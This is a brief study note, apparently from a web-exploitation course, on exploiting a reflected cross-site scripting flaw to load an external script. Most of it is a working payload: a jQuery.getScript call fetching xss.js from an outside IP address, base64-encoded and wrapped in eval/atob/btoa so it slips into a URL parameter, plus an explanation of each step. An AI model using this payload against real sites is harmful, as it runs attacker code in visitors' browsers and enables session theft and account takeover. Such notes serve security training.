---
tags:
  - jquery
  - xss
---

# Inject external script in url

Note: it is worked in site with vulnerable to XSS, and get parameter value can be evaluated in  client JS

We want inject:
```js
jQuery.getScript('http://192.168.49.55/xss.js')
```
Enconde this string to base64
![[Pasted image 20230430151850.png]]
Inject to url: 
```html
ref='+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTUveHNzLmpzJyk=')))+'
```

btoa  - encode to base64 response of eval
eval - evaluate script
atob - decode base64


## Resources:
1. web200.Cross-Site Scripting Exploitation and Case Study. Case Study: Shopizer Reflected XSS